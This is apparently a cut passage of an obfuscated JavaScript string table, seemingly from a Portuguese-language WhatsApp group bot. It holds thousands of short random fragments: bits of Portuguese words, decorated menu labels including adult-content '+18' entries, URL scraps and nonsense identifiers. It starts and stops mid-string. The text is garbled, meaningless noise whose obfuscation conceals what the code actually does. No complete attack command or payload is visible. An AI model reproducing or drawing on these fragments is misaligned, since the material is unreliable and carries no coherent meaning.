🤤", "o: *", 'PWqsV', "uma m", "o, en", 'CuUlp', 'Lzanh', 'TyXGo', 'WJwOm', '5a472', 'ifSxd', 'FigAu', 'fsGCC', 'YNPNQ', 'DhmFP', 'ceQVo', 'ifu', 'na...', " zero", 'sKjbx', '85f28', 'o.mp3', 'ZTSJc', "ê é h", 'rYAcI', 'platf', 'omati', "⪧ *Ga", 'emdom', 'aFmbQ', "🎥 𝟭𝟬𝟴", " LINK", "gar s", 'iBqiq', 'bLlgJ', '6f5e5', 'Viqqc', 'teway', 'DDcuN', 'QVIjj', '657b5', 'fusxU', 'oTbnz', 'qitYI', 'TjTuy', 'TIVOS', 'CQUwo', 'uUHvU', 'Tykun', " um a", "+18 4", 'mage-', 'uJXTZ', "  ║ ", 'uMbPM', ", usa", "a vis", 'CBGTJ', "O log", 'eleme', 'sKsos', "O DON", 'NcJGP', 'pagar', 'ynAvY', 'vwdvA', 'blqig', " E AB", 'ICNqi', 'kOkck', "ae o ", 'efixo', 'pUtyO', "e ele", 'kqvgV', 'JLvWm', 'UaGhc', 'soDUT', 'MoYDG', 'ZTijw', " meta", 'BLpFJ', 'iosa,', 'MxqaC', 'LXjPP', 'padrã', 'XXxrx', 'SezjY', 'atalg', 'KHdzt', 'BDrdt', 'yFkIV', 'como_', "\nAnti", "bar a", '.wiki', 'shGEM', "s seu", "te 1", "no pe", "h um ", "𝐎𝐃𝐎𝐒 ", "AIS A", "25 Go", "oi po", 'NHzUS', 'CobLC', "🔥 O g", "D): 5", "... ❱", 'b1a4e', 'NqLKT', 'arnie', 'NbPXC', 'rfyOz', 'pLVEb', " 2018", 'UfhZo', '%20In', 'FODvs', " adic", " é re", 'zDZta', 'kJcSM', 'UlDdn', 'XRomv', 'usado', " coma", 'frqXO', "te, v", "é né?", 'eyZEy', 'XWGvb', " M4", 'UYbds', 'ySvTG', 'DzuCz', 'Enorm', 'check', 'KlhXq', " que ", 'tGDhL', 'qQmTm', 'ZVLKJ', "da ap", "ing* ", "] pal", 'nUPeS', "Só do", "do? \n", 'UmAZD', 'golds', 'eUnRO', 'ZrYuv', "NK DA", " , me", 'thor', 'wUPMC', 'KQwtq', "t, qu", 'EbFBu', "a o g", 'qvzOk', "╠➥ @", "os. E", 'strad', "𝐕𝐀𝐑 𝐒", " impo", "──≽「 ", " ao t", 'JUcYm', 'VfYNG', 'CdroY', 'VXlxR', 'sbnZE', 'filho', "Ver L", 'ACING', 'NRfKl', "ers b", 'Lxxbo', 'GylSP', 'fNuIG', "\n*Bot", 'hat', 'pEOYB', "le fa", 'bToWa', 'HIDIR', 'GXGtl', 'wiki', 'fb.wa', " do t", " poss", 'ficar', 'ipand', 'ize', 'tivos', 'o3aXp', " segu", "tal :", "ta: ", 'GNcDg', "eito ", 'IeJib', "ais q", 'Hvbew', 'Image', 'jXceb', 'Mvjdo', 'TfUCb', 'gzvDJ', "ue já", 'IRnQJ', 'fEnsi', 'rNtsV', 'DXIRv', "so : ", 'OTbll', 'qjwUk', 'dd195', 'UQsKc', "m ADM", 'abili', "tal: ", '06,as', 'xsgPb', "e tra", "T POD", 'ynEDI', 'fVXMr', "🤡, el", 'Xnezn', 'uUVIY', 'CRUZE', 'alVCG', 'GAmwY', 'MWWMS', 'faRMr', 'lVFUT', 'emoji', 'HmPvu', 'lejlv', 'Simul', 'ttrbf', "r Has", "ode g", 'ada*~', "a con", '_GPT', 'ediaf', 'WEldf', 'nload', "A, AM", 'ripti', 'OtiIm', 'Plhrm', 'nato', 'boWNj', 'pos', 'zYUcx', "use n", "xar o", 'Updat', 'ZzHqX', 'Tzcwx', 'figst', 'HwkoW', " defa", 'jwqVO', 'iwzcf', 'HESLm', "jeta ", "\n\n- 🗓️", "e 2, ", "5: O ", 'mes5', 'marte', 'OIYVG', 'rem', "𝖵𝖮𝖢𝖤̂ ", 'sjKWM', '.0.op', 'rtfig', "os gr", 'lbmjj', " já j", 'pRqtU', 'NSxcb', 'eJAVO', 'GzJQh', 'dPLnr', 'KRkib', 'Nwpiw', 'UOqDj', 'QNrHe', 'HzsRm', 'ZWnXR', 'rhQex', "ja Pa", 'ologo', 'YQHbq', 'antis', "OS DE", '.x=6%', " da ", 'uSotb', '25564', "❄️ 𝐙𝐄𝐍", "🇯🇵 𝗘𝗥𝗭", 'ntili', "bro n", 'xcaVv', 'tador', 'cZUjl', 'pttyi', 'pi.co', 'PTuwq', 'DssiR', "m 2 f", 'USVvq', 'fc273', 'zdvEg', '𝐍𝐂𝐀𝐃𝐄', 'ecKva', 'FFWWT', 'zMJLv', 'pUoKE', 'GMgOB', 'kKQhM', 'XGobP', "\nGia:", "rios ", "14. 🕹️", "° → @", 'tKwQp', '660a9', 'mCvyA', 'HBCfU', 'sSTeC', '16047', 't/top', 'mQVQF', "a) al", 'uIGfu', 'i/ins', 'sqfxa', 'AiYsv', 'QHHit', "elar ", 'EQkLb', 'CIoax', 'bozlN', 'tatBJ', 'TpSdf', '𒋨·࣭࣪̇🔥', "𝐎+𝟏𝟖 ", "s apó", 'txt-s', 'CubKd', 'KsYZZ', 'zjjah', " a ca", 'pbuFZ', 'pXbbl', "ao ca", 'qQLDf', 'RGraL', 'JQtri', 'iser,', "1080 ", " })()", 'nULRm', 'OEZya', 'gHnXZ', 'iqRpx', 'KONZF', 'QWLhE', 'ofKvt', 'wJELt', "ROS, ", 'aXj6O', 'XnQhm', "liar ", 'attp4', 'ZSanB', 'Oohwa', 'igoEW', "✓ Par", 'torm', 'bFYxe', '15238234qkjBzM', 'HTJIi', "tome ", 'Nwyev', 'zuWai', 'MzgWB', 'LlPNL', "SO - ", 'UAxvG', 'ZNBzP', " 🆂🅴🆄🆂", 'juyuj', "as mã", " outr", "ig lu", "er: ", 'FclhR', 'conve', '9b700', "eo ne", 'hElSK', 'ligar', "𝐋 𝐃𝐄 ", 'xgFTl', 'vmMuU', 'xlACz', 'wyqPu', 'zEyrA', 'ahQfH', "ção ú", 'eIAwK', 'cQiau', " Chat", " Do L", 'se_da', "   💨 ", 'JFlOg', 'PobXp', "🔪 *Os", "OROA ", "oas A", "cial ", 'ar_o_', 'essag', 'vdd_d', "e esf", 'pqCkK', 'jzNLI', "\n\n「 @", 'tes.j', 'ONIlm', '_reta', 'hmBrd', "dos c", 'VriIZ', 'Kspkw', "sera ", 'luJMb', 'iveMo', 'MBJTl', " HADE", 'yJOIc', 'RDE.*', 'koPWF', 'VZIsy', "- 📁 𝑫", "z qua", '✔】ᴠᴀᴅ', "e o a", 'irpor', 'ontat', 'DqTMX', "ro nú", 'juwHz', ", ape", "ria v", "🗣️ 𝐌𝐄𝐍", 'jVijF', "Esse ", 'tarde', "tir a", 'uawOs', " duas", 'JHfBN', 'Nyhst', "s\n\nEn", 'PtPgy', ", uti", 'bwbRC', 'EMiLl', 'vkUkK', 'GjluZ', "ar, p", 'tfnQC', 'edia', 'vtfyS', 'IczCM', "ara j", "TXT (", 'FsaEm', 'WjVxm', 'hEVLW', 'digit', 'JWbSo', '|6|4|', "a*: *", 'dEJAg', '𝐕𝐎', 'JWSRe', 'oFRtq', "ROS:\n", 'UgVOM', 'rn_al', "tra e", "el V", "\nRein", 'padEn', 'doFCG', "io em", 'lVcCG', '✼❄️✼◈༻', 'EkWeO', 'Bhxsp', "zes p", 'hVjeY', 'ons', 'CEQiC', 'umber', 'JXBAY', 'riste', " arma", 'miCGk', 'RaLjO', "a apo", 'dHMqb', 'hUuEx', 'minad', 'ZdLMy', 'orth&', 'GfkOC', "_-_-\n", "s das", "𝐀𝐑𝐀 ❄️", " a ap", 'aUZOT', 'VsxVR', 'onder', 'QGxgx', "da.\n", "stá a", 'mente', 'fnFwM', 'RmJEj', 'Hmmmm', "os de", "item ", 'qIpUY', "te Ad", 'mMzjs', 'mzVWK', 'qyxIw', "i ter", '𝐑𝐈𝐍𝐃𝐀', 'ndxNH', " o va", 'nsXED', 'MXAfE', 'artid', 'eado', "\n║ 📅 ", " 𝐕𝐈𝐓𝐀", 'mento', 'AAchy', 'Gnczy', 'magem', 'fZhKS', 'Excel', "l obt", "(9)\n1", 'jryiA', "𝐈𝐓𝐄 𝐂", "\n\nSe ", "s est", "ity 🕹️", 'iDjNj', 'wysGL', 'OKCZD', 'vado✔️', 'RvVKr', 'DGeAs', 'éstim', 'Pbjho', 'wuXtG', 'JiVBB', "Mó bu", 'ais/5', "eio c", 'o_VbP', 'oHbfM', 'SXMlM', " ao b", "né, i", "AST D", "❌O re", 'mjbTp', 'er%C3', 'nado/', 'HfmfB', 'wbXXY', 'ZzADp', 'ngnyb', 'PPVIr', 'ceSzf', 'vado*', 'Forca', 'do✅', 'VVgFX', "𝑬𝑶 🖥", " uii ", '20511', 'WWYHw', "\nStat", 'gue-n', 'BPxDk', 'wvhbQ', " 𝐁𝐀𝐁𝐘", "po:\n\n", 'WplLP', 'MlIrC', "e let", " DO A", 'ZgFNe', 'RJXkR', "l meu", "i pod", 'bucet', 'es/An', 'ssCQr', 'quadr', 'YUcRX', "po da", 'ZuanL', 'ling:', 'fKbLM', 'utube', 'dqVAA', 'BWlZx', 'kSIEY', "𝐈 𝐃𝐎𝐂", ')+)+)', "sso t", 'JzrOg', '𝐂𝐇𝐀𝐍🔥', "do, e", "║✼ Ch", 'ormar', '298', 'pZDMQ', 'reaLo', 'wCcPv', " ), p", 'wOovA', "🇬 🇸\n\n", '𝐈𝐃𝐀𝐃𝐄', 'zloOj', 'iWKgW', "te De", 'lijFg', 'rm_av', 'UvcyE', "\t\t\t\t_", 'gaFzB', 'ayTex', 'omwEj', 'ukFEl', 'XcWlc', "\n\n~» ", " boa ", 'toimg', "S*\n*T", 'mlNYK', "a) ao", 'ShzkP', 'nsada', "ULO D", "me El", 'ZZsPV', 'ZBsEY', 'open.', "nder ", "io nã", 'ryOqM', '000&t', 'SxUYa', 'cução', 'qgXEI', 'MhNNm', 'nZldL', 'bQXaq', 'nujSy', 'Conté', "o) ai", 'Cwzxq', "só gr", 'iKRKo', " de t", 'erio', "e o q", 'mLoGV', 'HIHKm', "nhum ", 'kTcLa', 'ntEed', 'ehHAb', 'Heter', 'MENU.', 'ddhXs', 'lnZks', 'drada', "ada.\n", "valo ", 'KKUHK', 'ZpGme', " auto", "r2 (", 're-se', 'hRCiN', "e rea", 'nBKaG', 'FJuHr', 'ybpLL', "r, só", 'adore', 'vAGkk', "🔞 𝐁𝐀𝐁", 'KPKbo', 'xcluí', 'hWqJL', 'kSPdw', 'oMNoK', 'kObhR', 'sando', "der ", 'DANÇA', 'XsFAf', "um Go", 'tHBJX', 'ouiYn', 'gqHsa', 'ewyQU', 'Célul', 'xBnXB', ", foi", 'oAAsl', "ão Re", "2. 🕹️ ", "ção é", "izar ", 'orm.o', "m\n\nNã", "NE\nht", '*AQUI', "xar a", 'slice', 'oadUr', 'XXKSC', 'bjiWo', '.apk', "ki 1", 'e/g88', 'mpo=0', 'ORARI', 'Woxxz', 'LOHtP', 'leDel', 'ekGha', " 1 / ", 'rapid', " o an", 'avor,', 'XtVbK', "ly Be", 'el_gl', 'irHzD', 'XxKpJ', " TOMI", 'LTRUj', "ha de", 'sVlhH', 'FLoBW', 'LFcPa', 'QxyPO', 'sbwhF', 'NuSzc', " já e", '*REGI', "ta te", 'CeMZk', "o pod", '17669', 'ibuSQ', "k htt", 'ida.', 'uaKGX', 'HXRfN', 'yzWkw', '_sour', 'owltk', " 1 es", 'lGAMT', 'ono', 'pJXtb', 'weath', 'lHErF', 'siste', "o uti", 'itir', "do, p", 'YUvqB', " foto", '5427e', " só p", 'rbati', 'Knwew', 'DQrjx', 'edita', "\n♦️Let", '04:00', "o o m", 'QOtqP', 'ALcmK', 'IvkvW', "rve p", '=55&t', 'lTwpX', "ia pa", "║ 「 ", 'eJFqL', 'expir', 'kille', "sua t", "𝐃𝐎𝐒 ", 'cCNLZ', 'IGUS', 'face_', 'hQyqA', 'tmWZO', '0a355', 'incrí', 'SXqeO', "ts sh", 'kSsdV', 'wKtjV', "RA AD", '_____', 'secti', 'psPwG', 'HXmbN', 'evil', 'TXDUI', 'qLJJZ', 'djjit', "uma i", 'aRBlW', 'leitu', "as de", 'OssNQ', 'ico-M', 'NyHgC', 'uhxvO', 'qbUDV', 'oVVol', "🔞 𝐓𝐀𝐓", " COM ", 'WzQxq', 'LfAVZ', "ão IV", "e ser", 'olhar', 'rease', "hã  p", 'ATENÇ', 'eGqId', "gem: ", 'vKtDt', 'dejsQ', 'kpRxs', 'MqNJd', 'wBoSp', 'Vocns', "opa a", "do us", 'LVuqC', 'win', 'texto', " e co", 'MBIfw', 'haPqQ', 'cWKpo', 'gRbPq', 'te_us', 'auzvB', "ndo l", 'FqgBR', 'aRIXA', 'qakOM', 'RSP', "0\nhtt", 'bolão', 'nfo', 'vVnYI', 'nhã!*', "te su", 'NnopJ', "━╮\n┞┧", 'AQppA', 'Jvzub', "s e n", 'ess', "e: ", 'ycjkb', "a de ", 'ckets', 'GHTWJ', 'qc2', "e qui", "e fec", "por l", 'bdEAK', '1e551', 'ITNGj', 'IKZuP', "var e", "1 pre", 'yHT.z', 'GHOlD', 'GGDNh', 'Tbrlp', 'mRnoo', 'mDyVT', 'AÇÃO:', 'yceJm', 'achan', "uma c", 'nLflz', 'LlhjJ', 'AsLIw', 'flsgk', 'XCwhE', " a di", 'Ymtuc', 'ck-id', 'enWGq', 'jdfHp', 'cfYFj', "60 = ", 'FmcWm', 'iABQw', "n: ", 'mbxms', '.font', 'UJEDZ', 'sulta', "ias a", 'DzWAX', 'XFiAK', 'DTjVB', 'rDOnA', 'ybRaF', 'XNOOj', 'cutad', 'odePo', ". Com", 'nerat', 'inuto', 'play2', 'iCnkR', 'oQfEN', 'tofmx', 'gram2', "----\n", 'poder', 'abuTP', 'azar', 'vIrro', 'em...', 'egold', 'PcHkk', 'list', 'GnnkH', "as, h", 'iHNsg', "/Oi A", "um em", 'XIlrr', 'wyIAn', 'ntJGr', "'S WI", " /24h", 'e/gif', 'QVaXm', 'neFox', 'GSsfs', "\n𝑀𝐸𝑀𝐵", "es do", 'XLuHz', "e de ", 'IphZF', " ]\n*T", 'xpLlL', 'round', 'hGKFd', " \nest", 'sênci', 'excel', 'vkglb', 'ZRfno', 'mat', "eja b", "+55 9", "é con", 'HEWIQ', 'qChoy', 'vEAEM', ", vej", 'jlyfC', "eai ", " 𝐂𝐀𝐌𝐏", 'iJQxN', 'nwgoS', "rio s", 'feyjq', 'mXAMq', "or is", "◤😎 █▀", 'ef21d', 'ZOkDE', "🇯🇵 𝗛𝗜𝗡", 'pirad', 'TBDQr', 'EIRQG', "han 🔞", 'WEHsX', 'UCjbJ', 'ASoNn', 'nIJiN', 'xSJqx', 'DFaUh', 'YFHXA', '/qRpB', 'NSOtv', " hora", 'p.sir', 'PVMQR', 'hsYkt', 'rezpg', 'rm-fe', 'PluOR', 'FdYUt', 'XJMXx', 'XnrsB', 'pSLBg', 'Sievk', "bar ", "g -hi", "ium K", 'geTim', 'nes', " use ", '-CHAN', 'inoFV', 'rGYMI', "stão ", 'dQyIF', 'vmNXE', "el I", 'klvkb', 'yLHZt', '1|6', ').web', 'Dgkem', 'Inici', 'SeCzr', 'IqZgA', 'fItOf', 'ivar,', 'charA', 'refer', 'FXbQR', " é um", 'nJvpm', 'EVaMX', 'AriEh', 'també', 'GDtYU', " sere", 'MvUhW', 'JdgPN', 'ngKcZ', 'coqIA', "R ADM", 'SsEuZ', "ro* :", 'AoctS', 'vZSlP', 'ytmp3', "𝐄 ❌", "m rou", 'EOcZz', "o : ", 's2.js', "odo b", "e:\n", 'ead35', 'speit', 'tsNTc', 'messa', 'Códig', 'CXohA', 'tRvNr', 'CReRJ', 'ttiyU', 'ghMBM', 'hncaL', '═┉✼┉╗', 'boves', "UP𝜣\n\n", '41845', 'eTWQU', "6 - 7", ", e e", 'ocSCo', 'axios', 'tômag', 'wllIg', 'jBYmb', "I O M", 'od_cl', 'hzaWz', 'RmazX', 'emeEu', 'fzHLN', "Boa n", 'GNQsJ', 'MuQim', 'kDkjQ', '-fech', "\nPara", 'FeDuS', 'nder.', 'vlviS', " -_-", 'gyZcm', 'dica', "é cor", " / 0\n", "do', ", 'filen', 'kIyim', 'EgEOb', 'PzfZF', " Elit", 'Xkplx', "t 🕹️\n", " aman", 'GVKuc', "por \"", "eu 50", 'danil', "Tipo ", 'per.s', 'minut', 'tão', " pala", "🇯🇵 𝗬𝗨𝗥", 'ador:', 'mEHsE', 'wLVZz', 'gyWDO', "ine 🕹️", 'EBQdu', 'xQGbs', 'wVrpp', 'OyClx', 'LzbEu', 'upo``', 'WfmwT', 'vyvPw', 'huWhJ', 'onseg', 'YHtmO', 'eXFvc', '𝐃𝐀𝐃𝐄𝐒', "he My", 'appen', '❆╍╯', 'ujVJd', 'ZwFva', 'pKqnA', 'LMNBs', "r, vi", 'LLeDp', '𝐏𝐀𝐏𝐄𝐑', 'plaq4', 'rstwu', 'pgErI', "a 1 /", 'ta-st', ". O j", "um li", 'jnmvT', "ig hi", 'UkLGC', 'f9538', "❆ *RA", 'IgyzZ', 'EZCWO', "ex: ", "na pe", 'DONO', 'EVaWY', "o um ", 'srXUP', 'HER', " O GR", 'ATvGr', 'tMVEI', "aiba ", "ne! 🫣", "da né", "+18 1", 'srHCA', 'AsDKl', 'WoChh', 'ZkltS', 'QMryn', "ar pr", 'AQrwc', 'hqoIj', "s des", " 💥🎉\n\n", "ens n", 'axtvC', 'Akill', "ara p", 'nicia', 'hSMoo', 'KepHH', '.*_', 'QHVNp', 'yTYbF', 'DkEIn', 'eMsJB', "te, e", " 🤢🥵🥴", "es en", "one: ", 'Xbhte', 'iyYZO', 'oGKId', 'LQThZ', " /5 m", 'CUlNm', 'bTqUe', 'timo.', 'npMGK', 'dRiiA', "𝐊+𝟏𝟖 ", 'pbdrU', 'dyZfs', "m 5 s", 'kick', 'zwoMR', "ou de", '1e39f', "1 111", "TO2 ❄️", 'hrfBN', 'FGcto', "a Lop", '99999', 'Ctxat', 'nheci', "iu do", 'egra.', 'lter:', 'gkkff', "FIO 🌹", 'zjwWA', 'VETTE', 'BmIzC', 'tKdBN', " as m", 'ZENDO', "go no", " pres", 'NSOzO', " ar: ", 'bjiro', "o dad", '|1|2', "*Uma ", 'ɴᴀ💌【✔', 'm.br/', 'MBjIk', " ou o", 'NBbhW', 'orma:', 'NacKf', 'yOksJ', 'xkgTF', "égia ", 'QqbCn', 'webpm', 'ad=32', 'zvBNe', 'vxBDr', 'MJMiv', 'yIvXx', 'VBqAX', "𝗨𝗠𝗜𝗡 ", 'ZvqBK', 'andou', "𝑰𝑵𝑮*\n", 'dispo', " sad/", 'rcoma', 'DymnS', 'WARS&', 'twitt', 'SSFDL', 'NVrLG', 'xZTUu', 'UwVnM', 'hsXUu', "30 mi", 'weUhq', "rme o", 'ϴᏢϴΝᎬ', 'jaaes', 'le=it', 'wGBFo', 'PXYxf', "M USE", " nem ", 'gCpNM', 'sKelm', 'yXFvJ', 'eeNJH', 'decep', 'srbuW', 'RJyuP', 'vTDBz', 'mtPib', 'JAhcC', "sa id", 'espon', 'oje.*', "- ( h", 'r1Tim', 'rendi', 'QbrUL', "ra um", 'OFyrI', 'Agqgp', "o con", 'VapAV', 'dmWIz', 'MPEKH', "𝐔 𝐊𝐀𝐑", 'Apare', 'QSVzS', 'lZjdS', '!!!*⚠️', 'csSMj', 'EQKgl', " *Núm", 'IaQbJ', " -avo", 'BMWlg', 'VmAyz', "opy ", "* Aki", 'rsrIW', '🫡🏳️', 'SCqIM', 'edTex', 'tSkKq', " ❰ Pe", 'UcvDV', 'jVEIV', " um r", 'AEtgN', 'tle', 'FuDNJ', 'antii', "20. ❄️", 'RCYId', 'gqcns', 'EdMZS', 'bNILM', '74020', 'ufqYo', 'sLotM', "❄️ 𝐁𝐄𝐍", "r dig", " prom", "- Sor", 'afnCH', 'jDKEI', 'solic', 'yZfNj', "raft ", "k, tw", " Imme", "z. Bo", "23. ❄️", '440c3', 'zBEuk', "3. 🎌 ", "os, a", "ts bo", 'GodUz', "2 (CS", "🔞 𝐕𝐈́𝐃", 'on/ra', 'içãog', "hard ", 'otFdR', " está", 'UPZar', 'NuGWL', 'ength', "s, vo", "mo\n\n3", '𝐏𝐄𝐒🔥', "- Ven", 'eralD', 'WuHza', "ual T", " +55 ", 'TSZwj', " - AN", 'szDZf', 'QSvxn', "S don", "Que p", 'kgBlZ', 'pizgt', 'Xsxaz', "\nAtiv", '_url', "var, ", "a, 1m", "ue de", 'GeJmI', "é fan", "a Hor", 'uelo:', " Unic", "🇯🇵 𝗛𝗘𝗦", 'bOwHb', 'PREMI', 'SGeFl', "𝐌𝐀 ❄️", "ue es", '60ede', " |\n| ", 'papof', 'ile/6', 'SfOak', "isa d", '8mn6w', "as\n\nT", 'ihil3', ", nor", 'TVShb', 'erent', 'vwsjJ', 'ivWCZ', 'jpMwi', "𝐕𝐀𝐑 𝐎", 'mZHql', 'nzceH', 'uRVib', "Fale ", 'ZSVQD', 'jrSTm', 'rupo/', "r na ", "𝗢𝗥𝗜 🇯🇵", 'CvDaH', 'mXoZP', 'PGFvK', 'UsAih', 'oVgBL', "\n*MEM", 'int', 'GswcN', " 𝐀𝐐𝐔𝐈", 'gUgbv', 'Alhgx', '𝐒𝐀🔥', 'trim', 'ldyJI', 'comma', " usan", 'combi', "u 5 d", 'bswmR', "77. ❄️", "𝐔 𝐏𝐑𝐄", '_comb', 'JJmmY', "e dev", 'orren', "ar go", 'rkAqX', "os.\n\n", 'LXEag', 'on/%2', 'rimei', 'arOur', 'uxar.', 'INPrV', 'QVLqg', 'wQmRx', " comp", 'pEtry', 'SIMRk', "\nA 🟦🟦", 'jLwXu', 'SAmIg', 'LLLvE', 'GhFpH', 'bp-to', 'PvxqO', 'tuTHB', "hᥲ ᥙ꧑", 'TAJrs', 'ZYERY', 'kozud', 'shWkr', "po já", 'play_', " é ", "io 55", 'hwdrp', 'EucVH', "so se", "28. ❄️", 'tNQWp', "\ncoma", 'ZgyOQ', 'eIuLP', 'menu', "A, vo", "Ao Gr", 'pthTa', "Isso ", 'rIDzJ', 'gWvyx', 'XgcKN', 'ZELoN', 'wenNu', 'rickn', 'Desaf', 'forma', 'fdnZq', 'LfZxd', "um al", " FehG", " ALUG", "erá a", 'GGmWv', '✼┉═══', 'meter', "a lá.", "já po", 'WLXUf', 'WsPMc', 'MuyaD', 'Wmojd', 'uKarv', "𝐕𝐀𝐑 𝐌", 'hqLuR', "M uti", 'ᴘʀᴇᴛᴀ', 'RKlJE', "* 」\n", "D: ", '_*🥳Pa', "le er", " A qu", " MMOT", "\nProx", 'ia/%2', " 「 @", 'mocao', 'XOXGB', 'd691b', " (2)\n", '4Y0BO', 'rMygJ', 'HoKzk', 'rSGAG', 'EfbPi', 'FQpsF', 'VtSDp', 'kefwP', 'QYWaQ', 's/Ami', 'menua', 'dio', " -vco", '5f6d2', "mio m", 'sched', 'lizad', 'SqrdL', 'WHYpt', "ho / ", "bot s", 'QdwRd', 'XtcyG', "OU GR", 'bUGzY', 'YPrSF', 'vzfXG', 'hJzWc', 'GoTbC', '10000', 'JhpRT', "s ati", 'çamen', 'EMCLd', "né ", 'wzWKv', "da um", "✼┉╝\n\n", " meus", 'PIdIj', 'obal.', 'AdBTK', " O DO", "🌹\n", '-auto', " ocor", " 𝐌𝐀𝐑𝐈", "Olá, ", 'ji..', 'BLDFF', 'ZRmbR', 'mage', 'title', 'dFDkd', 'xXnen', 'dIpsA', '--ht-', 'RweTz', 'ethis', 'ImuXp', 'óxima', "os re", 'JDARc', 'W04WX', 'lLzyB', 'pos_m', 'aremp', 'JClyP', 'GANTE', 'GpaHh', 'dqhFm', 'ncede', 'TNNMx', 'mplo,', 'YQukd', 'rCFpg', "ente ", 'VrtYm', '229', 'bAJtm', " Erro", "𝐍𝐈𝐌𝐄 ", 'KohGi', 'Zznjq', '248', 'PaijK', 'cidad', 'JBKTQ', '|8|2|', 'AvdjL', " MOON", "i rod", 'rGdnY', '𝐎𝐒🔥', 'GmTnv', " Golp", "𝐀 𝐅𝐀𝐊", 'tMxqP', 'iTVTO', 'IkFLn', '65e3c', 'aWUAa', '𝐒𝐓𝐈𝐍𝐄', 'GkKLa', 'dIyQS', 'white', 'rIliI', 'HupSt', 'FiGex', 'KsDbH', "de 50", "ASO Q", 'input', 'JGYwc', 'carou', 'ovXDE', 'NKlXQ', 'ekiLG', 'usand', 'SPOTI', 'UEADO', "𝐑 𝐌𝐎𝐃", 'TeioW', 'tinde', 'PRIVA', 'GwcqV', 'nlmng', 'MybFR', "erá m", 'aWVEz', 'lzDBu', "r sol", 'figan', 'lxWWE', 'LEniQ', 'Qakgl', 'on/an', '://fb', 'ipACy', 'ATIWM', 'JSTOz', 'teShL', 'Dkmxd', "ca qu", 'WNLZb', "\nC ", 'a:min', 'adici', " ༶ Le", 'dcdmB', 'zmhpt', 'XSMkv', "TE2 ❄️", 'aução', 'oLkRB', 'Qgfnm', 'pedra', 'nNwZF', 'pJjCy', 'tkBSm', 'WoBOB', 'bUKIu', 'FutNC', "]. ex", "\nEsco", 'MOcjD', 'QmPEU', 'ApMTy', 'cnlsk', 'OXcJa', 'GBaNH', 'iqprv', 'ZPKND', "ou o ", '2|4|1', 'lIveb', 'daGvN', 'ifUNj', 'baixa', 'Mfkay', 'tnYeJ', "erar ", 'TUNE', 'a..', 'Qnnrd', 'iIuoi', 'RRsXV', 'aract', '/%20', 'ered', " + os", 'lHpog', 'bMxxE', "───┈ ", 'erm%3', "ros c", 'tori', 'oonED', 'BUULy', "que t", 'asxFj', 'SyASK', 'gMAos', 'XYSeS', 'UoFrf', 'vGCMb', "da 🌌", 'mazon', 'BtRjk', "OU ❄️\n", "*\nHid", "vel n", 'lpRtp', 'ios-a', 'kKwLO', 'zRyoU', 'LqPQr', " -af ", "nc ()", 'Pesqu', "- Olá", 'feio', ".. ❱", 'cXSiD', 'ukcyH', 'play3', 'tomar', "zado ", "os\n╏❆", 'tKAtx', "a, ve", 'Deram', 'SUWRf', 'HuttX', " > so", 'hJsZs', '𝐆𝐀𝐋𝐄𝐑', "ra Co", 'PkzDH', 'ediat', 'TIXEA', 'sKUgc', "sta p", 'cxASJ', 'Aninh', 'mb.jp', '/5581', 'PPSEL', " 🅵🅸🅻🅷", 'IjVfV', 'YSrDB', 'rGDOE', 'fhOJx', 'ard.s', 'arde.', "de 30", "do _-", 'FpCwx', 'ODJkp', 'ciono', "49. ❄️", "r pro", 'URYff', 'on/cm', 'KIwNX', 'shxju', "│ RAN", 'mVXrP', 'IgGIh', 'ufKly', "lo do", 'CaqCe', "5. ⚪ ", 'aoYIY', "to, v", 'VMxFQ', 'gpt', " do G", 'kiwFe', 'esso!', 'RcKsU', 'uery=', "oi Ze", 'BRINC', 'SIllF', ". O q", 'PSHSn', "25. 🔞", 'jKeDR', "oa pa", 'nQYKb', 'AdKXt', 'ByUQd', 'defin', 'EBFVY', '.stat', 'UdIfY', 'nYYuh', 'IyBVR', 'ZG5zZ', 'XdaPi', 'pnI0k', "𝐊𝐀 ❄️", "a do ", 'sELCB', 'kRziE', 'eres.', 'Ckahx', "o, já", 'pYxqk', "oji, ", 'bbb48', "os se", "𝐈 𝐈𝐌𝐀", " C 🔞\n", "com _", 'uiJKo', "14. 🔞", "tada ", 'DlqDA', 'LrIAx', 'ubar,', 'cpbDC', 'bAova', 'xwnLI', 'vFoIE', 'miEcL', 'tueyv', 'BhrjR', 'DngVb', 'GPIvj', ",    ", 'gxana', 'rkd_N', "r lin", 'sWith', 'DbZgo', 'xrOlE', 'ffadm', "* est", 'WSXun', "ada q", 'jina', 'h3bEw', 'erder', 'bxwJt', "■■ 10", "\n\nOLÁ", "ei 12", "a da ", 'iTdgG', "e ｯ", 'notar', 'ojis.', 'torio', 'son', 'uRwIo', 'LeARI', 'gMtfM', 'END:V', "• Lin", 'DmZxf', 'WVWUJ', 'PdGte', 'sWSRm', '𝐍𝐃𝐄𝐑🔥', 'ers+P', 'mVZRS', 'uibeY', 'fKWOF', 'TcBaC', "dor d", 'jKJLJ', 'lYlpX', '┉✼┉╝', 'lePic', 'MreVc', 'eWBqA', "po co", 'vVCDf', 'mDSbB', "var p", 'ryQZM', "d 1", 'aki-a', 'YBUhA', 'esso', 'ainer', 'jPjIK', 'b1a1a', " msg ", 'iFnyX', 'diaAt', "-+\n| ", '╭━◌━《', 'raBri', "SEU V", 'masco', "ig se", "UPO\n╚", 'egab', 'FdIkb', 'KvmIg', '*Esse', 'zoRGo', 'Falta', " 🇵 🇦 ", '❆̸⊱━━╍', 'nsUUM', "ber? ", 'Robot', 'aanim', 'gSlST', "🌹 DES", 'YhJDj', 'EhOuA', 'Erro,', "ÇÃO P", 'ckvOk', 'NfWMC', "a pes", "o, el", 'FaoNk', 'oad-l', 'posts', 'YshzL', 'QMPSH', 'ncewi', 'wnpZV', 'YIxMy', 'lWlAG', 'Sfiwb', 'vDLwV', 'uwmoK', 'wMEGH', "M\nhtt", "r, us", 'UFxRZ', 'WLKPp', "ig ha", 'ZAUsS', 'TRANS', 'D6247', 'execu', 'jIrKM', '𝐈𝐍𝐆𝐓𝐑', 'PGGvl', " Feit", "de, p", 'BVlDM', 'nxcOG', 'kuknj', 'FCDKb', 'Errou', 'MLVLI', "as su", "╠➥ ht", 'Maste', 'YSUEN', 'DIvGS', 'HLbjf', "𝑬𝑶 2 ", 'PqINK', 'BJYYv', 'FyrbK', 'úsica', 'DciFV', 'BZyMg', 'QNLhQ', 'QiRyH', 'eltYU', 'meenv', 'XQUIj', 'qrSJQ', "oku.\n", "oc2 ", 'APISI', 'cuGCK', 'YAfew', "O com", 'mleyS', 'mily=', 'ement', '°-°', 'qXlrg', '&ping', 'ADM', 'Humm.', "ões 